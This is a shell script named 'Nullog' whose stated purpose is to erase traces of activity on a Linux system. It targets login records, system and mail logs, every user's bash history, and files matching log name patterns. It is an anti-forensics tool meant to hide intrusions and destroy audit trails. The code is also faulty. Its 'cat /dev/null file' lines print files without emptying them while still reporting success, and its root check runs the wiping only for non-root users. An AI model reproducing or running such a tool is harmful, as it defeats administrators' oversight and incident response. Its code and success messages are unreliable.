#!/bin/sh

banner() {
    printf '\033[0;31m
         ████               ████
        ███                   ███
       ███                     ███
      ███                       ███
     ███                         ███
    ████                         ████
    ████                         ████
    ██████       ███████       ██████
    █████████████████████████████████
    █████████████████████████████████
    ███████████████████████████████ 
      ████ ███████████████████ ████  
           ███▀███████████▀███       
          ████──▀███████▀──████      
          █████───█████───█████      
          ███████▄█████▄███████      
           ███████████████████       
            █████████████████        
             ███████████████         
              █████████████          
               ███████████           
              ███──▀▀▀──███          
              ███─█████─███          
               ███─███─███           
                █████████
    \033[0;31m  _   _       _\033[0;37m _             
    \033[0;31m | \ | |_   _| \033[0;37m| | ___   __ _ 
    \033[0;31m |  \| | | | | \033[0;37m| |/ _ \ / _` |
    \033[0;31m | |\  | |_| | \033[0;37m| | (_) | (_| |
    \033[0;31m |_| \_|\__,_|_\033[0;37m|_|\___/ \__, |
    \033[0;31m               \033[0;37m         |___/ 

            \033[0;31m[\033[0;37mVersion 2.0\033[0;31m]

'
}

remove_login() {
    cat /dev/null /var/log/wtmp 2>/dev/null
    cat /dev/null /var/log/btmp 2>/dev/null
    cat /dev/null /var/log/lastlog 2>/dev/null
}

other_logs() {
    cat /dev/null /var/log/messages 2>/dev/null
    cat /dev/null /var/log/maillog 2>/dev/null
    cat /dev/null /var/log/secure 2>/dev/null
    cat /dev/null /var/log/syslog 2>/dev/null
    cat /dev/null /var/log/dmesg 2>/dev/null

    for mail_f in $(find /var/log/ -name "mail\.*" 2>/dev/null)
        do
            cat /dev/null $mail_f 2>/dev/null
    done
}

bash_history() {
    for bash_history in $(find / -name ".bash_history" 2>/dev/null)
        do
            cat /dev/null $bash_history 2>/dev/null
    done
}

logs_f() {
    find / -name "*\.log\.*" 2>/dev/null >> .logs
    find / -name "*\.log\.*\.*" 2>/dev/null >> .logs
    find / -name "*\.*\.log\.*" 2>/dev/null >> .logs

    while read log_f
        do
            cat /dev/null $log_f 2>/dev/null
            printf "\n\033[0;32m[+] \033[0;37mLog deleted: $log_f"
    done < .logs
    rm -f .logs
}

main() {
    banner
    sleep 1
    printf '\n\033[0;34m[*] \033[0;37mClearing system login logs\n'
    remove_login
    printf '\033[0;32m[+] \033[0;37mLogin logs successfully deleted!\n'
    sleep 1
    printf '\n\033[0;34m[*] \033[0;37mClearing other logs\n'
    other_logs
    printf '\033[0;32m[+] \033[0;37mOther logs successfully deleted!\n'
    sleep 1
    printf '\n\033[0;34m[*] \033[0;37mClearing system histories\n'
    bash_history
    printf '\n\n\033[0;32m[+] \033[0;37mSystem history deleted successfully!\n'
    sleep 1
    printf '\n\033[0;34m[*] \033[0;37mDeleting content inside log files'
    logs_f
    printf '\n\n\033[0;32m[+] \033[0;37mLog files cleared successfully!\n'
    printf '\n\033[0;34m[*] \033[0;37mClear command history "history -c"\n'
}

if [[ $EUID -ne 0 ]]; then
   printf "\033[0;34m[*] \033[0;37mYou are not running Nullog as root, for that reason only some logs that you have permission will be deleted. Do you really want to continue? [Press ENTER]" 
   read
   main
fi
